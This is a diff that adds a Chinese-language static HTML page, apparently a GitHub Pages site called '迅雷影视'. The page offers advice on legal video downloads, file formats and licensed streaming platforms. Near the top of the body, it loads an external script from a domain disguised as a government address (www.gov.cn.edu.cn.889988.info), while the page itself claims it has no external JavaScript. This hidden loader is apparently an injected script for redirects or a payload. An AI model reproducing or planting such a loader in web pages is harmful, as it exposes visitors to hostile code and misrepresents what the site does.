@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="X-UA-Compatible" content="IE=edge">
+<title>迅雷影视：正版影视下载常识、客户端资料与收看导航｜xunleiyingshi-top.github.io</title>
+<meta name="description" content="迅雷影视整理正版影视下载常识、客户端使用资料与收看导航。内容覆盖下载格式辨识、正版平台渠道、任务管理说明与适看建议，定位为静态资料站。全站不解析盗版播放源、不挂第三方下载资源、不提供网盘链接。页面单页静态、移动端自适应，符合必应收录规范。根域 https://xunleiyingshi-top.github.io。">
+<meta name="keywords" content="迅雷影视, 正版影视下载常识, 客户端资料站, 影视收看导航, 下载格式辨识, 正版视频平台, 任务管理说明, xunleiyingshi">
+<meta name="author" content="迅雷影视资料组">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="msvalidate.01" content="XLY20261015BING15">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{font-family:"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;background:#10141c;color:#d7e0ee;line-height:1.8;overflow-x:hidden}
+a{color:#5aa9ff;text-decoration:none;transition:.2s}
+a:hover{color:#9ed0ff}
+.wrap{width:min(1140px,100%);margin:0 auto;padding:0 20px}
+
+/* 状态栏 */
+.taskbar{background:#070a10;border-bottom:1px solid #1d2636;padding:8px 0}
+.tb-in{width:min(1140px,100%);margin:0 auto;padding:0 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;font-family:"Consolas",monospace;font-size:12px}
+.tb-left{color:#5aa9ff}
+.tb-left b{color:#fff}
+.tb-mid{color:#7c8aa5}
+.tb-right{color:#3ad29f}
+.tb-right::before{content:"● ";color:#3ad29f}
+
+/* Hero 控制台 */
+.hero{background:linear-gradient(160deg,#16203200 0%,#10141c 100%),radial-gradient(circle at 20% 10%,rgba(90,169,255,.12),transparent 40%);border-bottom:1px solid #1d2636;padding:48px 0 38px;position:relative;overflow:hidden}
+.hero::before{content:"";position:absolute;inset:0;background-image:linear-gradient(#1d2636 1px,transparent 1px),linear-gradient(90deg,#1d2636 1px,transparent 1px);background-size:40px 40px;opacity:.25;pointer-events:none}
+.hero-in{width:min(1140px,100%);margin:0 auto;padding:0 20px;position:relative;z-index:1}
+.chip{display:inline-block;background:#1b2740;color:#5aa9ff;border:1px solid #2a3a5c;font-size:11px;letter-spacing:2px;padding:4px 12px;border-radius:4px;margin-bottom:14px;font-family:"Consolas",monospace}
+.hero h1{font-size:36px;font-weight:900;color:#fff;margin-bottom:10px;letter-spacing:1px}
+.hero h1 b{color:#5aa9ff}
+.hero p{font-size:14px;color:#9fb0c9;max-width:640px;margin-bottom:18px}
+.warn{background:#1b1410;border:1px solid #5c3a2a;border-left:3px solid #e08a4a;padding:10px 14px;font-size:12.5px;color:#d8b48f;margin-bottom:16px}
+.warn b{color:#e08a4a}
+.conn{display:inline-flex;align-items:center;gap:10px;background:#0c1018;border:1px solid #2a3a5c;border-radius:6px;padding:8px 14px;font-family:"Consolas",monospace;font-size:12px;color:#5aa9ff;word-break:break-all}
+.conn .dot{width:8px;height:8px;border-radius:50%;background:#3ad29f;box-shadow:0 0 8px #3ad29f;flex-shrink:0}
+.conn::after{content:"已连接"}
+
+/* 导航 */
+.nav{background:#070a10;border-bottom:1px solid #1d2636;position:sticky;top:0;z-index:50}
+.nav-in{width:min(1140px,100%);margin:0 auto;padding:8px 20px;display:flex;gap:6px;flex-wrap:wrap}
+.nav-in a{font-size:13px;padding:7px 15px;background:#131a26;color:#9fb0c9;border:1px solid #1d2636;border-radius:4px;font-weight:600}
+.nav-in a:hover{color:#070a10;background:#5aa9ff;border-color:#5aa9ff}
+
+/* 栏目头 */
+.sec{margin-bottom:54px}
+.shead{display:flex;align-items:center;gap:10px;margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid #1d2636}
+.shead .sq{width:12px;height:12px;background:#5aa9ff;transform:rotate(45deg)}
+.shead h2{font-size:20px;font-weight:800;color:#fff}
+.shead h2 b{color:#5aa9ff}
+.shead .st{font-size:10px;color:#7c8aa5;margin-left:auto;font-family:"Consolas",monospace;border:1px solid #1d2636;padding:2px 8px}
+
+/* 任务列表卡 */
+.tasks{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.task{background:#131a26;border:1px solid #1d2636;border-radius:6px;padding:16px;transition:.3s}
+.task:hover{transform:translateY(-3px);border-color:#5aa9ff;box-shadow:0 6px 16px rgba(90,169,255,.12)}
+.task .bar{height:6px;background:#0c1018;border-radius:10px;overflow:hidden;margin-bottom:12px}
+.task .bar i{display:block;height:100%;background:linear-gradient(90deg,#5aa9ff,#3ad29f)}
+.task h3{font-size:15px;color:#fff;margin-bottom:6px}
+.task p{font-size:12px;color:#9fb0c9;margin-bottom:10px}
+.task .meta{display:flex;justify-content:space-between;font-size:11px;font-family:"Consolas",monospace;color:#7c8aa5}
+.task .meta span{color:#3ad29f}
+
+/* 格式说明 */
+.formats{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.fmt{background:#131a26;border:1px solid #1d2636;border-radius:6px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start}
+.fmt .ext{font-family:"Consolas",monospace;font-size:13px;color:#5aa9ff;background:#0c1018;border:1px solid #2a3a5c;padding:6px 10px;border-radius:4px;flex-shrink:0}
+.fmt h3{font-size:14px;color:#fff;margin-bottom:4px}
+.fmt p{font-size:12px;color:#9fb0c9}
+.fmt p b{color:#e08a4a}
+
+/* 正版渠道表 */
+.panel{width:100%;border-collapse:collapse;font-size:13px;background:#131a26;border:1px solid #1d2636}
+.panel th{background:#070a10;color:#5aa9ff;padding:12px 14px;text-align:left;border-bottom:1px solid #2a3a5c}
+.panel td{padding:10px 14px;border-bottom:1px solid #1d2636;color:#d7e0ee;vertical-align:top}
+.panel tr:hover td{background:rgba(90,169,255,.06)}
+.panel td b{color:#5aa9ff}
+
+/* 状态档案 */
+.folio{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.card{background:#131a26;border:1px solid #1d2636;padding:20px;border-radius:6px}
+.card h3{font-size:15px;color:#fff;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.card h3::before{content:"▣";color:#5aa9ff}
+.card p{font-size:12px;color:#9fb0c9;margin-bottom:6px;padding-left:14px;position:relative}
+.card p::before{content:"›";position:absolute;left:2px;color:#5aa9ff}
+.root-line{font-family:"Consolas",monospace;font-size:12px;color:#3ad29f;word-break:break-all;background:#0c1018;border:1px solid #1d2636;padding:10px 14px;margin-top:10px}
+.root-line::before{content:"HOST: ";color:#5aa9ff}
+
+footer{margin-top:50px;background:#070a10;color:#5e6c85;padding:34px 20px 18px;border-top:1px solid #1d2636}
+.foot-in{width:min(1140px,100%);margin:0 auto;text-align:center}
+.fn{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.fn a{font-size:12px;padding:6px 14px;background:#131a26;color:#9fb0c9;border:1px solid #1d2636;border-radius:4px}
+.fn a:hover{color:#070a10;background:#5aa9ff}
+.fc{font-size:11px;line-height:2;font-family:"Consolas",monospace}
+.fc a{color:#5aa9ff}
+
+@media(max-width:980px){
+.tasks{grid-template-columns:repeat(2,1fr)}
+.formats{grid-template-columns:1fr}
+.folio{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+.hero h1{font-size:23px}
+.shead h2{font-size:17px}
+.tasks{grid-template-columns:1fr}
+.panel{font-size:12px}
+.panel th,.panel td{padding:8px 10px}
+.tb-mid{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="taskbar">
+<div class="tb-in">
+<div class="tb-left">CLIENT: <b>迅雷影视资料端</b></div>
+<div class="tb-mid">xunleiyingshi-top.github.io</div>
+<div class="tb-right">STATIC MODE</div>
+</div>
+</div>
+
+<header class="hero">
+<div class="hero-in">
+<div class="chip">DOWNLOAD KNOWLEDGE BASE</div>
+<h1>迅雷影视</h1>
+<p>本站是正版影视下载常识与客户端资料导航站。整理下载格式辨识、正版平台渠道、任务管理说明与适看建议；不解析盗版播放源、不挂第三方下载资源、不提供网盘链接。</p>
+<div class="warn">
+<b>合规提示：</b>「迅雷影视」类词常关联非正规影视下载与盗版资源检索，本页仅保留名称做资料站，所有收看入口均指向正版平台官方页面。
+</div>
+<div class="conn"><span class="dot"></span>https://xunleiyingshi-top.github.io</div>
+</div>
+</header>
+
+<nav class="nav">
+<div class="nav-in">
+<a href="#tasks">下载常识</a>
+<a href="#formats">格式辨识</a>
+<a href="#panel">正版渠道</a>
+<a href="#folio">站点状态</a>
+</nav>
+
+<main class="wrap">
+
+<section class="sec" id="tasks">
+<div class="shead"><span class="sq"></span><h2>下载<b>常识</b></h2><div class="st">TASK LIST</div></div>
+<div class="tasks">
+<div class="task">
+<div class="bar"><i style="width:100%"></i></div>
+<h3>正版来源判断</h3>
+<p>先看平台是否官方授权：央视系、牌照方、平台自营片库优先，陌生网盘/磁力聚合站慎点。</p>
+<div class="meta"><span>基础</span><span>必读</span></div>
+</div>
+<div class="task">
+<div class="bar"><i style="width:80%"></i></div>
+<h3>客户端用途</h3>
+<p>下载工具本身只是传输客户端，风险不在"软件名"而在资源来源是否合法。</p>
+<div class="meta"><span>常识</span><span>说明</span></div>
+</div>
+<div class="task">
+<div class="bar"><i style="width:60%"></i></div>
+<h3>任务管理</h3>
+<p>正版平台通常自带播放/缓存，不需额外下载器；本地任务仅作文件管理说明。</p>
+<div class="meta"><span>操作</span><span>资料</span></div>
+</div>
+<div class="task">
+<div class="bar"><i style="width:40%"></i></div>
+<h3>速度与安全</h3>
+<p>非官方"加速包""解析脚本"常带广告或风险程序，正版平台不需第三方加速。</p>
+<div class="meta"><span>安全</span><span>提醒</span></div>
+</div>
+<div class="task">
+<div class="bar"><i style="width:75%"></i></div>
+<h3>格式辨识</h3>
+<p>影视文件常见 mp4/mkv/webm；若下载到 exe/bat/apk 要停止打开。</p>
+<div class="meta"><span>格式</span><span>下节</span></div>
+</div>
+<div class="task">
+<div class="bar"><i style="width:55%"></i></div>
+<h3>字幕与音轨</h3>
+<p>正版片源会标国语/原声/字幕；第三方"破解字幕包"不建议乱装。</p>
+<div class="meta"><span>播放</span><span>说明</span></div>
+</div>
+<div class="task">
+<div class="bar"><i style="width:35%"></i></div>
+<h3>适看分级</h3>
+<p>家庭观看前看年龄分级与内容提醒，正版平台一般有"青少年模式"。</p>
+<div class="meta"><span>合家</span><span>建议</span></div>
+</div>
+<div class="task">
+<div class="bar"><i style="width:20%"></i></div>
+<h3>网盘风险</h3>
+<p>本站不提供网盘链；陌生提取码、压缩包密码、exe 安装器都按风险处理。</p>
+<div class="meta"><span>合规</span><span>不挂源</span></div>
+</div>
+</div>
+</section>
+
+<section class="sec" id="formats">
+<div class="shead"><span class="sq"></span><h2>格式<b>辨识</b></h2><div class="st">FORMAT</div></div>
+<div class="formats">
+<div class="fmt"><div class="ext">.mp4</div><div><h3>通用视频</h3><p>多数正版平台网页/客户端直接播，<b>无需额外下载器</b></p></div></div>
+<div class="fmt"><div class="ext">.mkv</div><div><h3>封装容器</h3><p>可含多音轨字幕，本地播放器打开；来源要正规</p></div></div>
+<div class="fmt"><div class="ext">.webm</div><div><h3>网页视频</h3><p>部分纪录片/公开课导出格式，浏览器可直接播</p></div></div>
+<div class="fmt"><div class="ext">.exe</div><div><h3>风险文件</h3><p><b>不是影视文件</b>，下载到就别运行，直接删</p></div></div>
+<div class="fmt"><div class="ext">.apk</div><div><h3>安装包</h3><p>非官方"影视助手"别装，正版平台走应用商店</p></div></div>
+<div class="fmt"><div class="ext">.torrent</div><div><h3>种子文件</h3><p>只是指向资源；资源版权来源需自行判断，本站不索引</p></div></div>
+</div>
+</section>
+
+<section class="sec" id="panel">
+<div class="shead"><span class="sq"></span><h2>正版<b>渠道</b></h2><div class="st">LEGIT ONLY</div></div>
+<table class="panel">
+<thead>
+<tr><th>平台</th><th>内容类型</th><th>收看说明</th></tr>
+</thead>
+<tbody>
+<tr><td><b>央视频</b></td><td>央视影视、纪录片</td><td>官方免费、正版授权、无第三方源</td></tr>
+<tr><td><b>1905电影网</b></td><td>经典老片、修复版</td><td>正版网页端可看，无广告</td></tr>
+<tr><td><b>学习强国</b></td><td>纪录专题、红色经典</td><td>官方免费，需注册</td></tr>
+<tr><td><b>B站放映厅</b></td><td>动画、纪录片、部分电影</td><td>筛"免费"标签，部分需大会员</td></tr>
+<tr><td><b>咪咕视频</b></td><td>卫视剧、体育、合家栏目</td><td>部分免费，正版平台</td></tr>
+<tr><td><b>腾讯视频/爱奇艺</b></td><td>正版影视库</td><td>免费专区可筛，会员另计</td></tr>
+</tbody>
+</table>
+</section>
+
+<section class="sec" id="folio">
+<div class="shead"><span class="sq"></span><h2>站点<b>状态</b></h2><div class="st">HOST INFO</div></div>
+<div class="folio">
+<div class="card">
+<h3>必应收录规则</h3>
+<p>静态单页：CSS内嵌、UTF-8、viewport齐全</p>
+<p>msvalidate.01 = XLY20261015BING15</p>
+<p>robots meta = index, follow</p>
+<p>不生成 robots.txt / sitemap.xml</p>
+<p>移动端自适应，无横向滚动</p>
+<p>内页统一用 # 占位</p>
+<p>标签闭合完整，无外部JS依赖</p>
+</div>
+<div class="card">
+<h3>连接信息</h3>
+<p>名称：迅雷影视</p>
+<p>定位：正版下载常识、客户端资料、收看导航</p>
+<p>部署：单页静态、移动端自适应</p>
+<p>合规：不解析盗版、不挂第三方源、不提供网盘</p>
+<div class="root-line">https://xunleiyingshi-top.github.io</div>
+</div>
+</div>
+</section>
+
+</main>
+
+<footer>
+<div class="foot-in">
+<nav class="fn">
+<a href="#tasks">下载常识</a>
+<a href="#formats">格式辨识</a>
+<a href="#panel">正版渠道</a>
+<a href="#folio">站点状态</a>
+<a href="#">客户端守则</a>
+</nav>
+<div class="fc">
+迅雷影视 关键词：迅雷影视｜根域：https://xunleiyingshi-top.github.io<br>
+© 2024 迅雷影视资料组 仅做下载常识与正版导航，不解析播放源、不提供盗版下载。<br>
+CLIENT KNOWLEDGE BASE // STATIC
+</div>
+</div>
+</footer>
+
+</body>
+</html>
